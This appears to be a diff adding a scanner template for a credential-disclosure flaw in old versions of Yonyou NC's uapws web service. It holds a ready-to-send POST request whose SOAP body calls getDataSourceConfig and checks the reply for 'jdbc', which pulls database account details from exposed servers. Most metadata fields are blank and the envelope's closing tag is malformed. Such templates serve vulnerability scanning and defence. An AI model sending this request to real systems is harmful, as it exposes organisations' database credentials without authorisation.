@@ -1,0 +1,26 @@
+id:
+
+info:
+  name: 用友NC uapws接口老版本存在数据库账号密码泄露
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: |
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
+    <soapenv:Header/>
+    <soapenv:Body>
+    <por:getDataSourceConfig/>
+    </soapenv:Body>
+    </soapenv:Envelope
+response1:
+  headers:
+  body: jdbc
+  code:
+requests2:
+response2:
